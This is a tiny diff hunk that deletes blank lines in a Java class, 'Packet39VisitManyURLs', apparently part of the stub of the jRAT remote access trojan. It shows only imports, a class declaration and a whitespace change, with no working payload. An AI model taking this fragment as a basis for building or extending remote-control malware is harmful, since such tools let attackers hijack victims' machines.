@@ -4,8 +4,6 @@ import java.net.URI;
 
 import pro.jrat.stub.Connection;
 
-
-
 public class Packet39VisitManyURLs extends AbstractIncomingPacket {
 
 	@Override
